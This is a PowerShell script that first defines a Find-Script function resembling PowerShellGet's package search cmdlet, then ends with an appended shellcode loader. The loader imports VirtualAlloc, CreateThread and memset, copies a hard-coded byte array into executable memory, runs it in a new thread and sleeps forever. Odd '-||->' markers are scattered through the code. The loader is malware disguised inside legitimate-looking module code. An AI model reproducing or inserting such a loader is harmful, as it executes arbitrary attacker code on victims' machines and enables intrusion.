 -||-> function Find-Script {
    
    [CmdletBinding(HelpUri = 'https://go.microsoft.com/fwlink/?LinkId=619785')]
    [outputtype("PSCustomObject[]")]
    Param
    (
        [Parameter(ValueFromPipelineByPropertyName = $true,
            Position = 0)]
        [ValidateNotNullOrEmpty()]
        [string[]]
        $Name,

        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [ValidateNotNull()]
        [string]
        $MinimumVersion,

        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [ValidateNotNull()]
        [string]
        $MaximumVersion,

        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [ValidateNotNull()]
        [string]
        $RequiredVersion,

        [Parameter()]
        [switch]
        $AllVersions,

        [Parameter()]
        [switch]
        $IncludeDependencies,

        [Parameter()]
        [ValidateNotNull()]
        [string]
        $Filter,

        [Parameter()]
        [ValidateNotNull()]
        [string[]]
        $Tag,

        [Parameter()]
        [ValidateNotNull()]
        [ValidateSet('Function', 'Workflow')]
        [string[]]
        $Includes,

        [Parameter()]
        [ValidateNotNull()]
        [string[]]
        $Command,

        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [ValidateNotNullOrEmpty()]
        [Uri]
        $Proxy,

        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [PSCredential]
        $ProxyCredential,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string[]]
        $Repository,

        [Parameter(ValueFromPipelineByPropertyName = $true)]
        [PSCredential]
        $Credential,

        [Parameter()]
        [switch]
        $AllowPrerelease
    )

    Begin {
         -||-> Install-NuGetClientBinaries -CallerPSCmdlet $PSCmdlet -Proxy $Proxy -ProxyCredential $ProxyCredential <-||- 
    }

    Process {
         -||-> $ValidationResult =  -||-> Validate-VersionParameters -CallerPSCmdlet $PSCmdlet `
            -Name $Name `
            -MinimumVersion $MinimumVersion `
            -MaximumVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion `
            -AllVersions:$AllVersions `
            -AllowPrerelease:$AllowPrerelease <-||-  <-||- 

         -||-> if ( -||-> -not $ValidationResult <-||- ) {
            
            
            return
        } <-||- 

         -||-> $PSBoundParameters['Provider'] = $script:PSModuleProviderName <-||- 
         -||-> $PSBoundParameters[$script:PSArtifactType] = $script:PSArtifactTypeScript <-||- 
         -||-> if ( -||-> $AllowPrerelease <-||- ) {
             -||-> $PSBoundParameters[$script:AllowPrereleaseVersions] = $true <-||- 
        } <-||- 
         -||-> $null = $PSBoundParameters.Remove("AllowPrerelease") <-||- 

         -||-> if ( -||-> $PSBoundParameters.ContainsKey("Repository") <-||- ) {
             -||-> $PSBoundParameters["Source"] = $Repository <-||- 
             -||-> $null = $PSBoundParameters.Remove("Repository") <-||- 

             -||-> $ev = $null <-||- 
             -||-> $repositories =  -||-> Get-PSRepository -Name $Repository -ErrorVariable ev -verbose:$false <-||-  <-||- 
             -||-> if ( -||-> $ev <-||- ) { return } <-||- 

             -||-> $RepositoriesWithoutScriptSourceLocation = $false <-||- 
             -||-> foreach ($repo in  -||-> $repositories <-||- ) {
                 -||-> if ( -||-> -not $repo.ScriptSourceLocation <-||- ) {
                     -||-> $message = $LocalizedData.ScriptSourceLocationIsMissing -f ( -||-> $repo.Name <-||- ) <-||- 
                     -||-> Write-Error -Message $message `
                        -ErrorId 'ScriptSourceLocationIsMissing' `
                        -Category InvalidArgument `
                        -TargetObject $repo.Name `
                        -Exception 'System.ArgumentException' <-||- 

                     -||-> $RepositoriesWithoutScriptSourceLocation = $true <-||- 
                } <-||- 
            } <-||- 

             -||-> if ( -||-> $RepositoriesWithoutScriptSourceLocation <-||- ) {
                return
            } <-||- 
        } <-||- 

         -||-> $PSBoundParameters["MessageResolver"] = $script:PackageManagementMessageResolverScriptBlockForScriptCmdlets <-||- 

         -||-> $scriptsFoundInPSGallery = @() <-||- 

        
         -||-> $isRepositoryNullOrPSGallerySpecified = $false <-||- 
         -||-> if ( -||-> $Repository -and ( -||-> $Repository -Contains $Script:PSGalleryModuleSource <-||- ) <-||- ) {
             -||-> $isRepositoryNullOrPSGallerySpecified = $true <-||- 
        }
        elseif ( -||-> -not $Repository <-||- ) {
             -||-> $psgalleryRepo =  -||-> Get-PSRepository -Name $Script:PSGalleryModuleSource `
                -ErrorAction SilentlyContinue `
                -WarningAction SilentlyContinue <-||-  <-||- 
            
             -||-> if ( -||-> $psgalleryRepo <-||- ) {
                 -||-> $isRepositoryNullOrPSGallerySpecified = $true <-||- 
            } <-||- 
        } <-||- 

         -||-> PackageManagement\Find-Package @PSBoundParameters | Microsoft.PowerShell.Core\ForEach-Object {
             -||-> $psgetItemInfo =  -||-> New-PSGetItemInfo -SoftwareIdentity $_ -Type $script:PSArtifactTypeScript <-||-  <-||- 

             -||-> if ( -||-> $psgetItemInfo.Type -eq $script:PSArtifactTypeScript <-||- ) {
                 -||-> if ( -||-> $AllVersions -and -not $AllowPrerelease <-||- ) {
                    
                    
                    
                     -||-> if ( -||-> $psgetItemInfo.AdditionalMetadata -and $psgetItemInfo.AdditionalMetadata.IsPrerelease -eq $false <-||- ) {
                         -||-> $psgetItemInfo <-||- 
                    } <-||- 
                }
                else {
                     -||-> $psgetItemInfo <-||- 
                } <-||- 
            } elseif ( -||-> $PSBoundParameters['Name'] -and -not ( -||-> Test-WildcardPattern -Name ( -||-> $Name | Microsoft.PowerShell.Core\Where-Object {  -||-> $psgetItemInfo.Name -like $_ <-||-  } <-||- ) <-||- ) <-||- ) {
                 -||-> $message = $LocalizedData.MatchInvalidType -f ( -||-> $psgetItemInfo.Name, $psgetItemInfo.Type, $script:PSArtifactTypeScript <-||- ) <-||- 
                 -||-> Write-Error -Message $message `
                            -ErrorId 'MatchInvalidType' `
                            -Category InvalidArgument `
                            -TargetObject $Name <-||- 
            } <-||- 

             -||-> if ( -||-> $psgetItemInfo -and
                $isRepositoryNullOrPSGallerySpecified -and
                $script:TelemetryEnabled -and
                ( -||-> $psgetItemInfo.Repository -eq $Script:PSGalleryModuleSource <-||- ) <-||- ) {
                 -||-> $scriptsFoundInPSGallery += $psgetItemInfo.Name <-||- 
            } <-||- 
        } <-||- 

        
        
         -||-> if ( -||-> $isRepositoryNullOrPSGallerySpecified <-||- ) {
             -||-> Log-ArtifactNotFoundInPSGallery -SearchedName $Name -FoundName $scriptsFoundInPSGallery -operationName PSGET_FIND_SCRIPT <-||- 
        } <-||- 
    }
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xde,0xd9,0x74,0x24,0xf4,0xbd,0xa1,0x6e,0x32,0x3e,0x5a,0x33,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x6a,0x14,0x03,0x6a,0xb5,0x8c,0xc7,0xc2,0x5d,0xd2,0x28,0x3b,0x9d,0xb3,0xa1,0xde,0xac,0xf3,0xd6,0xab,0x9e,0xc3,0x9d,0xfe,0x12,0xaf,0xf0,0xea,0xa1,0xdd,0xdc,0x1d,0x02,0x6b,0x3b,0x13,0x93,0xc0,0x7f,0x32,0x17,0x1b,0xac,0x94,0x26,0xd4,0xa1,0xd5,0x6f,0x09,0x4b,0x87,0x38,0x45,0xfe,0x38,0x4d,0x13,0xc3,0xb3,0x1d,0xb5,0x43,0x27,0xd5,0xb4,0x62,0xf6,0x6e,0xef,0xa4,0xf8,0xa3,0x9b,0xec,0xe2,0xa0,0xa6,0xa7,0x99,0x12,0x5c,0x36,0x48,0x6b,0x9d,0x95,0xb5,0x44,0x6c,0xe7,0xf2,0x62,0x8f,0x92,0x0a,0x91,0x32,0xa5,0xc8,0xe8,0xe8,0x20,0xcb,0x4a,0x7a,0x92,0x37,0x6b,0xaf,0x45,0xb3,0x67,0x04,0x01,0x9b,0x6b,0x9b,0xc6,0x97,0x97,0x10,0xe9,0x77,0x1e,0x62,0xce,0x53,0x7b,0x30,0x6f,0xc5,0x21,0x97,0x90,0x15,0x8a,0x48,0x35,0x5d,0x26,0x9c,0x44,0x3c,0x2e,0x51,0x65,0xbf,0xae,0xfd,0xfe,0xcc,0x9c,0xa2,0x54,0x5b,0xac,0x2b,0x73,0x9c,0xd3,0x01,0xc3,0x32,0x2a,0xaa,0x34,0x1a,0xe8,0xfe,0x64,0x34,0xd9,0x7e,0xef,0xc4,0xe6,0xaa,0xa0,0x94,0x48,0x05,0x01,0x45,0x28,0xf5,0xe9,0x8f,0xa7,0x2a,0x09,0xb0,0x62,0x43,0xa0,0x4a,0xe4,0x3e,0xda,0xf7,0x55,0xd6,0x26,0xf8,0x84,0x7b,0xae,0x1e,0xcc,0x93,0xe6,0x89,0x78,0x0d,0xa3,0x42,0x19,0xd2,0x79,0x2f,0x19,0x58,0x8e,0xcf,0xd7,0xa9,0xfb,0xc3,0x8f,0x59,0xb6,0xbe,0x19,0x65,0x6c,0xd4,0xa5,0xf3,0x8b,0x7f,0xf2,0x6b,0x96,0xa6,0x34,0x34,0x69,0x8d,0x4f,0xfd,0xff,0x6e,0x27,0x02,0x10,0x6f,0xb7,0x54,0x7a,0x6f,0xdf,0x00,0xde,0x3c,0xfa,0x4e,0xcb,0x50,0x57,0xdb,0xf4,0x00,0x04,0x4c,0x9d,0xae,0x73,0xba,0x02,0x50,0x56,0x3a,0x7e,0x87,0x9e,0x48,0x6e,0x1b <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



